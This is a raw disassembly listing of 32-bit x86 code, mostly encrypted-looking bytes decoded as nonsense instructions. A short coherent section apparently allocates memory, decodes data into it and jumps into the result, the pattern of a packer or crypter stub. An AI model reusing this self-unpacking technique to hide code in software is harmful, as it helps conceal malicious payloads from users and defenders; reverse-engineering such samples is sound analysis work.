  4163ee:	repnz adc bh,BYTE PTR [ebx+0x5f]
  4163f2:	stc    
  4163f3:	sti    
  4163f4:	rcl    DWORD PTR ds:0x5a3407f4,0xad
  4163fb:	(bad)  
  4163fd:	ins    BYTE PTR es:[edi],dx
  4163fe:	push   DWORD PTR [ecx]
  416400:	dec    esi
  416401:	add    bl,BYTE PTR [edi+0x1e]
  416404:	sbb    eax,0x7bd70215
  416409:	outs   dx,DWORD PTR ds:[esi]
  41640a:	dec    esi
  41640b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41640c:	mov    bl,0xcd
  41640e:	fwait
  41640f:	test   al,0xa0
  416411:	stos   DWORD PTR es:[edi],eax
  416412:	lahf   
  416413:	or     al,0x19
  416415:	xchg   DWORD PTR [esi+0x1a],ebp
  416418:	mov    eax,0xa0926132
  41641d:	es add esi,ebx
  416420:	in     al,dx
  416421:	push   edx
  416422:	enter  0x45c4,0x89
  416426:	inc    esp
  416427:	jmp    0x416411
  416429:	xor    BYTE PTR [edi],bl
  41642b:	jecxz  0x41642d
  41642d:	cmp    eax,0xed7ebf55
  416432:	pop    esp
  416433:	aad    0x67
  416435:	inc    edx
  416436:	cmp    al,0x68
  416438:	push   cs
  416439:	lods   al,BYTE PTR ds:[esi]
  41643a:	fist   DWORD PTR [ecx-0x45]
  41643d:	jge    0x4163d8
  41643f:	lea    ebx,[edi]
  416441:	dec    eax
  416442:	inc    edx
  416443:	or     al,0xf1
  416445:	jg     0x416486
  416447:	aad    0x75
  416449:	test   DWORD PTR [eax],ebx
  41644b:	imul   esp,DWORD PTR [ebp+0x64757876],0x299097fc
  416455:	fistp  DWORD PTR [eax+0x638f4439]
  41645b:	and    ebx,DWORD PTR [esi-0x3246a95f]
  416461:	add    cl,BYTE PTR [ebx-0xe]
  416464:	jmp    0xd80c7c7c
  416469:	mov    DWORD PTR [esi-0x15],ebx
  41646c:	push   ebp
  41646d:	aad    0xf3
  41646f:	sti    
  416470:	les    ecx,FWORD PTR ds:0x49c94e95
  416476:	rcl    ecx,0x32
  416479:	jbe    0x416434
  41647b:	cmp    DWORD PTR [ebx],ebx
  41647d:	mov    WORD PTR [ebx],es
  41647f:	mov    eax,ds:0xd6d8133f
  416484:	data16 sub al,0xe8
  416487:	addr16 inc edx
  416489:	mov    esp,0xb84263bb
  41648e:	pop    ecx
  41648f:	jnp    0x4164a7
  416491:	jg     0x416460
  416493:	nop
  416494:	sbb    al,0xa1
  416496:	mov    edx,0xf334a901
  41649b:	push   esi
  41649c:	push   es
  41649d:	inc    ebp
  41649e:	stos   DWORD PTR es:[edi],eax
  41649f:	inc    eax
  4164a0:	rol    BYTE PTR [ebx-0x3],0x3c
  4164a4:	mov    bh,0xa2
  4164a6:	test   BYTE PTR [edi],al
  4164a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164a9:	adc    al,0x72
  4164ab:	out    dx,al
  4164ac:	popf   
  4164ad:	iret   
  4164ae:	mov    esp,0x412eb094
  4164b3:	and    al,0xca
  4164b5:	sbb    al,0x8f
  4164b7:	sbb    eax,0x63836a3e
  4164bc:	lods   al,BYTE PTR ds:[esi]
  4164bd:	sbb    ch,BYTE PTR [esi+0x2c72de77]
  4164c3:	out    dx,al
  4164c4:	fisub  DWORD PTR [edx-0x28fe39a]
  4164ca:	push   eax
  4164cb:	jne    0x4164e5
  4164cd:	ret    
  4164ce:	stos   BYTE PTR es:[edi],al
  4164cf:	or     eax,DWORD PTR [ecx-0x32]
  4164d2:	fst    QWORD PTR [ebp+0x1b]
  4164d5:	lahf   
  4164d6:	xor    edx,ebp
  4164d8:	sbb    bl,dh
  4164da:	cmp    ebp,DWORD PTR [edi]
  4164dc:	xor    eax,0x813697e3
  4164e1:	xor    edx,ebp
  4164e3:	outs   dx,BYTE PTR ds:[esi]
  4164e4:	ret    
  4164e5:	cli    
  4164e6:	jl     0x4164ef
  4164e8:	imul   ebp,DWORD PTR [esi],0xce2c3297
  4164ee:	add    DWORD PTR [ebx+0x2822089e],0xff8d107a
  4164f8:	aam    0x50
  4164fa:	pop    ecx
  4164fb:	loope  0x4164fb
  4164fd:	fwait
  4164fe:	rcr    al,0x2a
  416501:	shl    BYTE PTR [ecx+esi*8+0x44],0x28
  416506:	xor    ecx,DWORD PTR [ebx]
  416508:	and    eax,0x5de2b667
  41650d:	jl     0x416561
  41650f:	(bad)  
  416510:	repz sbb eax,0x848e763d
  416516:	sbb    eax,0xdf565732
  41651b:	or     al,0x82
  41651e:	out    0xf,eax
  416520:	jecxz  0x4164f8
  416522:	mov    al,ds:0x268cf3c2
  416527:	fidiv  DWORD PTR [edx]
  416529:	xchg   BYTE PTR [edi+edi*4-0x5e],dl
  41652d:	loope  0x416509
  41652f:	call   0x79f2c4fa
  416534:	into   
  416535:	pop    edx
  416536:	bound  edx,QWORD PTR [esp+edx*1]
  416539:	pop    edx
  41653a:	jae    0x4164ed
  41653c:	cmp    al,0xd3
  41653e:	ret    
  41653f:	sbb    DWORD PTR [ebx-0x549eb09b],edi
  416545:	push   esi
  416546:	dec    esi
  416547:	repnz ins BYTE PTR es:[edi],dx
  416549:	mov    esp,0x8cdee962
  41654e:	cmp    eax,0x44ea579
  416553:	sbb    eax,0x788e435b
  416558:	test   al,0xd7
  41655a:	lods   eax,DWORD PTR ds:[esi]
  41655b:	xor    eax,0xc721008d
  416560:	fwait
  416561:	mov    ch,0xa8
  416563:	mov    gs,WORD PTR [ecx+0x3c]
  416566:	sahf   
  416567:	push   edx
  416568:	shr    al,cl
  41656a:	cmp    al,0xba
  41656c:	popa   
  41656d:	lods   eax,DWORD PTR ds:[esi]
  41656e:	xchg   esp,eax
  41656f:	ja     0x416539
  416571:	adc    eax,0x8c42e69c
  416576:	mov    cl,0x56
  416578:	sub    al,bh
  41657a:	inc    ebx
  41657b:	dec    edi
  41657c:	in     eax,dx
  41657d:	jae    0x4165e6
  41657f:	ror    BYTE PTR [eax+0x47],cl
  416582:	in     al,dx
  416583:	mov    ds:0x9a2faa39,al
  416588:	loopne 0x416603
  41658a:	sub    al,0x67
  41658c:	cmc    
  41658d:	stos   DWORD PTR es:[edi],eax
  41658e:	test   eax,0x816e01f
  416593:	in     eax,dx
  416594:	dec    eax
  416595:	call   0xc99e75e6
  41659a:	stos   DWORD PTR es:[edi],eax
  41659b:	jmp    0x4165d3
  41659d:	cli    
  41659e:	in     eax,dx
  41659f:	(bad)  
  4165a0:	out    dx,al
  4165a1:	dec    ecx
  4165a2:	cwde   
  4165a3:	ret    
  4165a4:	push   ss
  4165a5:	inc    eax
  4165a6:	mov    ds:0x46c22663,eax
  4165ab:	xor    al,0x77
  4165ad:	test   al,dl
  4165af:	sbb    al,0x9b
  4165b1:	shr    eax,cl
  4165b3:	cmp    BYTE PTR [ebp-0x66807088],bh
  4165b9:	adc    DWORD PTR [edi-0x1a1d3007],ebx
  4165bf:	pushw  ss
  4165c1:	dec    eax
  4165c2:	loop   0x416620
  4165c4:	lahf   
  4165c5:	cmp    DWORD PTR [ebp-0x3abc86a2],ecx
  4165cb:	mov    ebp,0xd04c3b44
  4165d0:	xor    DWORD PTR [eax+0x31],ecx
  4165d3:	and    BYTE PTR [edi],ah
  4165d5:	cmp    BYTE PTR ds:0xd6f8b97,dh
  4165db:	and    BYTE PTR [edx-0x2e75f0d],0xa0
  4165e2:	jl     0x4165e4
  4165e4:	test   DWORD PTR [esi],0x21b1aa0c
  4165ea:	sub    DWORD PTR [si],ebp
  4165ed:	int    0xb8
  4165ef:	jg     0x4165b4
  4165f1:	push   ecx
  4165f2:	mov    edx,0xf0b8c93
  4165f7:	add    al,0x67
  4165f9:	pop    es
  4165fa:	ss into 
  4165fc:	mov    ds:0xb26c1bc3,al
  416601:	ret    0x3900
  416604:	sub    BYTE PTR ds:0xbe3ce6ba,al
  41660a:	inc    esi
  41660b:	mov    gs,WORD PTR ds:[esi-0x19]
  41660f:	mov    bh,0x76
  416611:	fcompp 
  416613:	cmp    al,0xc4
  416615:	lock in al,dx
  416617:	frstor [eax]
  416619:	ss inc edx
  41661b:	sbb    BYTE PTR [eax-0xff653dd],ah
  416621:	ret    0x3b41
  416624:	mov    cl,0xed
  416626:	(bad)  
  416627:	xlat   BYTE PTR ds:[ebx]
  416628:	neg    dl
  41662a:	jns    0x41666f
  41662c:	add    esp,esi
  41662e:	into   
  41662f:	shl    BYTE PTR [edx],cl
  416631:	push   cs
  416632:	inc    edi
  416633:	or     al,0x8a
  416635:	sbb    esp,DWORD PTR [ebp+0x7e]
  416638:	add    BYTE PTR [ebx-0x5f6dd8bd],bh
  41663e:	icebp  
  41663f:	mov    cl,0xb5
  416641:	add    al,0x88
  416643:	and    al,dh
  416645:	adc    al,0x6c
  416647:	test   eax,0xdcb27e67
  41664c:	inc    esi
  41664d:	aam    0x12
  41664f:	cld    
  416650:	mov    ecx,0xd8f86b04
  416655:	into   
  416656:	call   0x31cf:0x822059d4
  41665d:	xchg   edi,eax
  41665e:	mov    dh,0x6e
  416660:	xor    ch,BYTE PTR [esp+ebx*1+0x2fe842fb]
  416667:	cmp    DWORD PTR [edx+edx*8-0x60],edi
  41666b:	and    DWORD PTR [edi],eax
  41666d:	adc    ch,BYTE PTR [eax]
  41666f:	or     cl,al
  416671:	jae    0x416618
  416673:	jns    0x41661b
  416675:	adc    dl,BYTE PTR [edi]
  416677:	xor    DWORD PTR [ebx-0x267067f5],edx
  41667d:	enter  0x837,0x91
  416681:	enter  0xce6a,0x9e
  416685:	add    BYTE PTR [ecx-0x106279ff],bh
  41668b:	aaa    
  41668c:	mov    al,0x44
  41668e:	xchg   esp,eax
  41668f:	call   DWORD PTR [edx]
  416691:	pop    ss
  416692:	mov    edi,0x7bdaeeaa
  416697:	shr    DWORD PTR [ebx+eax*4-0x3c],cl
  41669b:	fdivr  DWORD PTR [edx]
  41669d:	enter  0x19f9,0x2e
  4166a1:	and    DWORD PTR [esi-0x45],ebx
  4166a4:	ror    BYTE PTR [eax-0x53cc78],0x7d
  4166ab:	mov    ch,0xef
  4166ad:	xlat   BYTE PTR ds:[ebx]
  4166ae:	dec    edx
  4166af:	fwait
  4166b0:	push   0x8ee1b735
  4166b5:	lahf   
  4166b6:	call   0x1bb6af70
  4166bb:	dec    ebx
  4166bc:	xlat   BYTE PTR ds:[ebx]
  4166bd:	stc    
  4166be:	push   edx
  4166bf:	inc    esp
  4166c0:	sbb    al,0xfb
  4166c2:	jecxz  0x41667a
  4166c4:	mov    esi,0x8daecd00
  4166c9:	cmc    
  4166ca:	pop    ds
  4166cb:	cmp    ebp,DWORD PTR [edx]
  4166cd:	mov    dh,0xd8
  4166cf:	clc    
  4166d0:	jbe    0x416668
  4166d2:	jbe    0x4166ef
  4166d4:	xor    ecx,DWORD PTR [eax-0x5a]
  4166d7:	and    al,0xea
  4166d9:	dec    edx
  4166da:	stc    
  4166db:	fwait
  4166dc:	in     al,dx
  4166dd:	popa   
  4166de:	mov    al,ds:0x465a95
  4166e3:	imul   BYTE PTR [ebp-0x4e]
  4166e6:	ja     0x4166e5
  4166e8:	out    0x90,eax
  4166ea:	test   al,0xf1
  4166ec:	push   ebx
  4166ed:	and    al,0xbb
  4166ef:	sub    dl,dh
  4166f1:	sbb    DWORD PTR [edx+0x1da0a410],eax
  4166f7:	(bad)  
  4166f8:	xor    eax,0xdbac88a5
  4166fd:	jl     0x41673b
  4166ff:	es sahf 
  416701:	cwde   
  416702:	(bad)  
  416703:	addr16 aaa 
  416705:	mov    eax,ds:0x2eaba6d6
  41670a:	mov    esp,0xa461b7a7
  41670f:	push   ebx
  416710:	jmp    0x4166d6
  416712:	sbb    al,0x4
  416714:	cwde   
  416715:	fsub   DWORD PTR [eax-0x1e4784fa]
  41671b:	xor    DWORD PTR [edi],ebp
  41671d:	jecxz  0x4166bd
  41671f:	mov    bl,0x86
  416721:	and    bh,BYTE PTR [ebx-0x40ee7729]
  416727:	aad    0xbf
  416729:	pop    ss
  41672a:	pop    ebp
  41672b:	cmp    al,0xaa
  41672d:	xor    al,0x8c
  41672f:	push   edi
  416730:	mov    dh,0x9d
  416732:	cmp    esi,DWORD PTR [ecx+ecx*8-0x3af721a7]
  416739:	std    
  41673a:	inc    edi
  41673b:	sahf   
  41673c:	(bad)  
  41673e:	xlat   BYTE PTR ds:[ebx]
  41673f:	mov    ds,WORD PTR [ecx+0x26]
  416742:	lods   al,BYTE PTR ds:[esi]
  416743:	mov    ds:0x6c5ff010,al
  416748:	inc    esp
  416749:	and    al,BYTE PTR [esi+0x32405d91]
  41674f:	fidiv  DWORD PTR [ebx+0x65256c00]
  416755:	xchg   DWORD PTR [esi-0x2e391735],esp
  41675b:	sbb    ebp,edi
  41675d:	ret    
  41675e:	repnz xor al,0xb9
  416761:	out    0xa3,eax
  416763:	dec    ecx
  416764:	jnp    0x416753
  416766:	or     eax,0x7f812165
  41676b:	call   0xdedf:0xd4688c97
  416772:	mov    eax,0xb4bb3f77
  416777:	sub    edi,edx
  416779:	imul   ebx,DWORD PTR [ebp-0x185226cb],0x741b3a36
  416783:	and    edi,DWORD PTR [edi+0x74]
  416786:	popf   
  416787:	mov    dh,0x9c
  416789:	or     al,0x45
  41678b:	loope  0x41675e
  41678d:	mov    al,ds:0xfa2ea1a8
  416792:	cmp    bl,bh
  416794:	mov    al,ds:0xcc043735
  416799:	mov    ecx,0xdec2b958
  41679e:	dec    ebx
  41679f:	aas    
  4167a0:	jge    0x4167b8
  4167a2:	pusha  
  4167a3:	xchg   edx,eax
  4167a4:	mov    ebx,0x195b4b81
  4167a9:	jp     0x4167be
  4167ab:	inc    esp
  4167ac:	pop    ecx
  4167ad:	xor    esp,DWORD PTR [edi-0x47fe256b]
  4167b3:	mov    ds:0x1415ff22,al
  4167b8:	add    BYTE PTR [ecx+0x0],0x89
  4167bc:	inc    ebp
  4167bd:	aam    0xf
  4167bf:	mov    bh,0x45
  4167c1:	aam    0x3d
  4167c3:	cmp    DWORD PTR ds:0x2f750000,eax
  4167c9:	mov    DWORD PTR [ebp-0x14],0xe0d
  4167d0:	lea    ecx,[ebp-0x28]
  4167d3:	push   ecx
  4167d4:	call   DWORD PTR ds:0x418018
  4167da:	mov    DWORD PTR [ebp-0x60],eax
  4167dd:	mov    DWORD PTR [ebp-0x54],0x3a
  4167e4:	mov    BYTE PTR [ebp-0x34],0x0
  4167e8:	mov    DWORD PTR [ebp-0x8],0xe8b4da89
  4167ef:	mov    DWORD PTR [ebp-0x68],0x10b527
  4167f6:	jmp    0x416806
  4167f8:	mov    BYTE PTR ds:0x430700,0x0
  4167ff:	mov    BYTE PTR ds:0x41a770,0x0
  416806:	push   0x0
  416808:	call   DWORD PTR ds:0x418018
  41680e:	mov    DWORD PTR [ebp-0x2c],eax
  416811:	push   DWORD PTR ds:0x418018
  416817:	pop    edx
  416818:	mov    DWORD PTR [ebp-0x6c],edx
  41681b:	lea    edx,[ebp-0x40]
  41681e:	push   edx
  41681f:	mov    eax,DWORD PTR [ebp-0x60]
  416822:	push   eax
  416823:	call   DWORD PTR ds:0x418024
  416829:	mov    DWORD PTR [ebp-0x44],eax
  41682c:	push   DWORD PTR [ebp-0x30]
  41682f:	push   0x1000
  416834:	mov    eax,DWORD PTR [ebp-0x14]
  416837:	add    eax,0x46
  41683a:	push   eax
  41683b:	push   0x0
  41683d:	mov    ebx,DWORD PTR [ebp-0x44]
  416840:	call   ebx
  416842:	push   eax
  416843:	pop    ebx
  416844:	mov    DWORD PTR [ebp-0x4],ebx
  416847:	mov    ecx,DWORD PTR [ebp-0x68]
  41684a:	sub    ecx,0xdae0b
  416850:	mov    DWORD PTR [ebp-0x68],ecx
  416853:	cmp    DWORD PTR [ebp-0x4],0x0
  416857:	jne    0x416862
  416859:	push   0x0
  41685b:	push   0x0
  41685d:	call   0x417f22
  416862:	mov    edx,DWORD PTR [ebp-0x4]
  416865:	add    edx,DWORD PTR [ebp-0x14]
  416868:	mov    eax,DWORD PTR [ebp-0x8]
  41686b:	mov    DWORD PTR [edx],eax
  41686d:	mov    ecx,DWORD PTR [ebp-0x4]
  416870:	add    ecx,DWORD PTR [ebp-0x54]
  416873:	mov    DWORD PTR [ebp-0x5c],ecx
  416876:	mov    edx,DWORD PTR ds:0x418024
  41687c:	mov    DWORD PTR [ebp-0x4c],edx
  41687f:	mov    eax,DWORD PTR [ebp-0x4]
  416882:	add    eax,DWORD PTR [ebp-0x14]
  416885:	mov    ecx,DWORD PTR [ebp+0x8]
  416888:	mov    DWORD PTR [eax+0x4],ecx
  41688b:	mov    edx,DWORD PTR [ebp-0x4]
  41688e:	add    edx,DWORD PTR [ebp-0x14]
  416891:	mov    DWORD PTR [ebp-0xc],edx
  416894:	cmp    DWORD PTR [ebp-0x68],0x0
  416898:	jbe    0x4168b5
  41689a:	mov    eax,DWORD PTR [ebp-0xc]
  41689d:	push   eax
  41689e:	mov    ecx,DWORD PTR [ebp-0x14]
  4168a1:	push   ecx
  4168a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4168a5:	add    edx,DWORD PTR [ebp-0x68]
  4168a8:	push   edx
  4168a9:	mov    eax,DWORD PTR [ebp-0x4]
  4168ac:	push   eax
  4168ad:	call   0x417e34
  4168b2:	add    esp,0x10
  4168b5:	cmp    DWORD PTR [ebp-0x5c],0x0
  4168b9:	je     0x4168c9
  4168bb:	push   DWORD PTR [ebp-0x4c]
  4168be:	push   DWORD PTR [ebp-0x6c]
  4168c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4168c4:	push   ecx
  4168c5:	jmp    ecx
  4168c7:	jmp    0x4168cf
  4168c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4168cc:	mov    DWORD PTR [ebp-0x18],ecx
  4168cf:	mov    eax,0x1
  4168d4:	pop    ebx
  4168d5:	mov    esp,ebp
  4168d7:	pop    ebp
  4168d8:	ret    
  4168d9:	push   ebp
  4168da:	mov    ebp,esp
  4168dc:	pop    ebp
  4168dd:	ret    
  4168de:	push   ebp
  4168df:	mov    ebp,esp
  4168e1:	sub    esp,0x54
  4168e4:	mov    DWORD PTR [ebp-0x34],0x0
  4168eb:	mov    DWORD PTR [ebp-0x4],0x0
  4168f2:	mov    DWORD PTR [ebp-0x50],0x0
  4168f9:	mov    DWORD PTR [ebp-0x4c],0x0
  416900:	mov    DWORD PTR [ebp-0x30],0x0
  416907:	lea    eax,[ebp-0x38]
  41690a:	push   eax
  41690b:	push   0x8
  41690d:	call   DWORD PTR ds:0x418020
  416913:	call   DWORD PTR ds:0x418014
  416919:	mov    DWORD PTR [ebp-0x30],eax
  41691c:	lea    ecx,[ebp-0x48]
  41691f:	push   ecx
  416920:	call   DWORD PTR ds:0x418010
  416926:	mov    edx,DWORD PTR [ebp-0x34]
  416929:	push   edx
  41692a:	call   0x416959
  41692f:	add    esp,0x4
  416932:	call   0x417e25
  416937:	mov    DWORD PTR [ebp-0x54],0x0
  41693e:	jmp    0x416949
  416940:	mov    eax,DWORD PTR [ebp-0x54]
  416943:	add    eax,0x1
  416946:	mov    DWORD PTR [ebp-0x54],eax
  416949:	cmp    DWORD PTR [ebp-0x54],0x64
  41694d:	jae    0x416951
  41694f:	jmp    0x416940
  416951:	xor    eax,eax
  416953:	mov    esp,ebp
  416955:	pop    ebp
  416956:	ret    0x10
  416959:	push   ebp
  41695a:	mov    ebp,esp
  41695c:	sub    esp,0x40
  41695f:	push   esi
  416960:	mov    DWORD PTR [ebp-0x40],0x0
  416967:	mov    DWORD PTR [ebp-0x3c],0x0
  41696e:	mov    DWORD PTR [ebp-0x34],0x0
  416975:	mov    DWORD PTR [ebp-0x28],0x0
  41697c:	mov    DWORD PTR [ebp-0x20],0x0
  416983:	mov    DWORD PTR [ebp-0x2c],0x0
  41698a:	mov    DWORD PTR [ebp-0x30],0x449e28
  416991:	mov    DWORD PTR [ebp-0x28],0xad2f6b57
  416998:	mov    DWORD PTR [ebp-0x38],0x0
  41699f:	mov    eax,DWORD PTR [ebp-0x28]
  4169a2:	mov    DWORD PTR [ebp-0x24],eax
  4169a5:	mov    DWORD PTR [ebp-0x4],0x0
  4169ac:	mov    ecx,DWORD PTR ds:0x418014
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	push   0x0
  4169b7:	push   0x4e
  4169b9:	push   0x1e
  4169bb:	push   0x0
  4169bd:	push   0xffffffff
  4169bf:	call   DWORD PTR ds:0x41801c
  4169c5:	test   eax,eax
  4169c7:	je     0x417e04
  4169cd:	lds    eax,FWORD PTR [eax+eax*2]
  4169d0:	jecxz  0x416a4b
  4169d2:	and    esi,DWORD PTR [edi+0x6db10ba5]
  4169d8:	sub    eax,eax
  4169da:	ja     0x416a3a
  4169dc:	rcr    BYTE PTR [ebx+0x7a],1
  4169df:	and    esi,DWORD PTR [edi+0x6db10fa5]
  4169e5:	imul   edi,DWORD PTR [edi],0xffffff88
  4169e8:	pop    esi
  4169e9:	shl    bl,1
  4169eb:	jp     0x416a10
  4169ed:	mov    bh,0xa5
  4169ef:	cmpxchg DWORD PTR [ebp+0x2b],ebp
  4169f3:	aas    
  4169f4:	mov    BYTE PTR [esi-0x30],bl
  4169f7:	jecxz  0x416a73
  4169f9:	and    esi,DWORD PTR [edi+0x6db10fa5]
  4169ff:	sub    edi,DWORD PTR [edi]
  416a01:	mov    BYTE PTR [esi-0x30],bl
  416a04:	jecxz  0x416a80
  416a06:	and    esi,DWORD PTR [edi+0x6db007a5]
  416a0c:	sub    esi,DWORD PTR [ecx]
  416a0e:	xchg   edi,eax
  416a0f:	in     al,0xde
  416a11:	jecxz  0x4169e1
  416a13:	sub    bh,BYTE PTR [edx-0x7c]
  416a16:	mov    bh,0xb0
  416a18:	and    esi,esp
  416a1a:	push   ds
  416a1b:	fdiv   QWORD PTR [esi]
  416a1d:	mov    ecx,0xc5535a90
  416a22:	retf   0xc368
  416a25:	or     al,0x46
  416a27:	pop    ds
  416a28:	jmp    0x416a69
  416a2a:	mov    esi,0x9757158d
  416a2f:	(bad)  
  416a30:	push   0xffffff91
  416a32:	pop    ds
  416a33:	pop    esi
  416a34:	push   ecx
  416a35:	test   al,0x37
  416a37:	mov    esi,0xe46c3ec3
  416a3c:	test   DWORD PTR [edx-0x22],esp
  416a3f:	or     DWORD PTR [esi+0x11],ecx
  416a42:	test   DWORD PTR [ebx-0x26],edx
  416a45:	(bad)  
  416a46:	jp     0x416a6b
  416a48:	mov    bh,0xa5
  416a4a:	cmpxchg DWORD PTR [ebp+0x51],ebp
  416a4e:	lock sahf 
  416a50:	shr    dh,1
  416a52:	dec    ebp
  416a53:	add    bh,dh
  416a55:	mov    DWORD PTR [ebx],ecx
  416a57:	ja     0x416ac5
  416a59:	push   ebx
  416a5a:	test   DWORD PTR [edi+0x55],eax
  416a5d:	jnp    0x416a42
  416a5f:	add    eax,0xdd1901a7
  416a64:	rcl    BYTE PTR [esi+ebx*2-0xfc81d07],cl
  416a6b:	test   al,0x3e
  416a6d:	pop    edi
  416a6e:	adc    BYTE PTR [eax+edi*2+0x1a],ah
  416a72:	pop    ds
  416a73:	adc    eax,0x8d506ef6
  416a78:	or     eax,0x6a5bd4d8
  416a7d:	xchg   edx,eax
  416a7e:	(bad)  [edx-0x50]
  416a81:	sbb    al,0x91
  416a83:	lock and edi,0x35
  416a87:	xchg   ecx,eax
  416a88:	(bad)  
  416a89:	xchg   edx,eax
  416a8a:	or     esi,DWORD PTR [edi+0x6c]
  416a8d:	push   ebx
  416a8e:	test   DWORD PTR [esi+0x55],eax
  416a91:	pop    ss
  416a92:	jg     0x416a2f
  416a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a95:	loope  0x416ad0
  416a97:	iret   
  416a98:	rol    BYTE PTR [ecx-0x521dac3d],cl
  416a9e:	ins    DWORD PTR es:[edi],dx
  416a9f:	pop    es
  416aa0:	add    ecx,DWORD PTR ds:[ebp-0x7dd58731]
  416aa7:	(bad)  
  416aa8:	test   BYTE PTR [eax],0x26
  416aab:	es or  eax,0x6ac649c6
  416ab1:	call   0xeb56:0x79b0c9a1
  416ab8:	ss out dx,al
  416aba:	dec    ebp
  416abb:	add    bh,dh
  416abd:	mov    bh,0xa5
  416abf:	cmpxchg DWORD PTR [ebp+0x2b],ebp
  416ac3:	aas    
  416ac4:	mov    BYTE PTR [esi-0x30],bl
  416ac7:	jecxz  0x416b43
  416ac9:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416acf:	sub    edi,DWORD PTR [edi]
  416ad1:	mov    BYTE PTR [esi-0x30],bl
  416ad4:	jecxz  0x416b00
  416ad6:	data16 mov bh,0xa5
  416ad9:	inc    ebx
  416ada:	mov    al,0x6e
  416adc:	sub    ebx,DWORD PTR [ecx-0x3a]
  416adf:	adc    ebx,DWORD PTR [edi-0x48dc851d]
  416ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae6:	cmpxchg DWORD PTR [ebp-0x35],ebp
  416aea:	aas    
  416aeb:	mov    bl,BYTE PTR [edi-0x25]
  416aee:	loop   0x416b60
  416af0:	and    esi,DWORD PTR [edi+0x6db10b47]
  416af6:	scas   eax,DWORD PTR es:[edi]
  416af7:	cmp    DWORD PTR [eax+0x7ae3d05e],ecx
  416afd:	pusha  
  416afe:	or     ah,BYTE PTR [ebp+0x2b7db10f]
  416b04:	aas    
  416b05:	mov    BYTE PTR [esi-0x2b],bl
  416b08:	jecxz  0x416b84
  416b0a:	and    esi,edi
  416b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b0d:	pop    fs
  416b0f:	ins    DWORD PTR es:[edi],dx
  416b10:	sub    edi,DWORD PTR [edi]
  416b12:	mov    bl,BYTE PTR [esi-0x30]
  416b15:	out    0x7a,al
  416b17:	and    dh,BYTE PTR [edi+0x6db10fa5]
  416b1d:	cs aas 
  416b1f:	mov    DWORD PTR [esi-0x30],ebx
  416b22:	jecxz  0x416b9e
  416b24:	and    esi,DWORD PTR [edi+0x6db10395]
  416b2a:	das    
  416b2b:	aas    
  416b2c:	mov    BYTE PTR [esi+ebp*1-0x19],dl
  416b30:	jp     0x416b53
  416b32:	mov    bh,0xe5
  416b34:	mov    ?,WORD PTR [ecx-0x77c0c493]
  416b3a:	dec    esi
  416b3b:	shl    bl,1
  416b3d:	jp     0x416b62
  416b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b41:	pop    fs
  416b43:	ins    DWORD PTR es:[edi],dx
  416b44:	sub    edi,DWORD PTR [edi]
  416b46:	mov    BYTE PTR [esi-0x30],bl
  416b49:	repz jp 0x416b6f
  416b4c:	mov    bh,0xa5
  416b4e:	cmpxchg DWORD PTR [ebp+0x2b],ebp
  416b52:	aas    
  416b53:	mov    BYTE PTR [esi-0x2c],bl
  416b56:	jecxz  0x416bce
  416b58:	and    ebp,esi
  416b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b5b:	cmpxchg DWORD PTR [ebp-0x15],ebp
  416b5f:	xor    al,0x88
  416b61:	or     ebp,edi
  416b63:	jecxz  0x416bdf
  416b65:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416b6b:	sub    edi,DWORD PTR [edi]
  416b6d:	mov    BYTE PTR [esi-0x30],bl
  416b70:	jecxz  0x416bec
  416b72:	and    esi,DWORD PTR [edi+0x61910fa5]
  416b78:	sub    esp,DWORD PTR [edi]
  416b7a:	mov    BYTE PTR [esi-0x30],bl
  416b7d:	jecxz  0x416bf9
  416b7f:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416b85:	sub    edi,DWORD PTR [edi]
  416b87:	mov    BYTE PTR [esi-0x30],bl
  416b8a:	jecxz  0x416c06
  416b8c:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416b92:	sub    edi,DWORD PTR [edi]
  416b94:	mov    BYTE PTR [esi-0x30],bl
  416b97:	jecxz  0x416c13
  416b99:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416b9f:	sub    edi,DWORD PTR [edi]
  416ba1:	mov    BYTE PTR [esi-0x30],bl
  416ba4:	jecxz  0x416c20
  416ba6:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416bac:	sub    edi,DWORD PTR [edi]
  416bae:	mov    BYTE PTR [esi-0x30],bl
  416bb1:	jecxz  0x416c2d
  416bb3:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416bb9:	sub    edi,DWORD PTR [edi]
  416bbb:	mov    BYTE PTR [esi-0x30],bl
  416bbe:	jecxz  0x416c3a
  416bc0:	and    esi,DWORD PTR [edi+0x6db10fa5]
  416bc6:	sub    edi,DWORD PTR [edi]
  416bc8:	mov    BYTE PTR [esi-0x30],bl
  416bcb:	jecxz  0x416c47
  416bcd:	or     eax,0xc577c0c3
  416bd2:	ins    DWORD PTR es:[edi],dx
  416bd3:	sub    edi,DWORD PTR [edi]
  416bd5:	mov    dh,ch
  416bd7:	fninit 
  416bd9:	jp     0x416c0e
  416bdb:	mov    bh,0xa5
  416bdd:	(bad)  
  416bdf:	imul   ebp,DWORD PTR [ebx],0xd05e8c3f
  416be5:	mov    bl,0x3f
  416be7:	pusha  
  416be8:	test   ecx,esi
  416bea:	inc    eax
  416beb:	mov    cl,0x6d
  416bed:	sub    edi,DWORD PTR [edi]
  416bef:	mov    BYTE PTR [esi-0x10],bl
  416bf2:	jecxz  0x416c6e
  416bf4:	ret    
  416bf5:	cdq    
  416bf6:	xlat   BYTE PTR ds:[ebx]
  416bf7:	jl     0x416bbc
  416bf9:	push   cs
  416bfa:	sub    edi,DWORD PTR [edi]
  416bfc:	mov    BYTE PTR [esi-0x50],bl
  416bff:	jecxz  0x416c7b
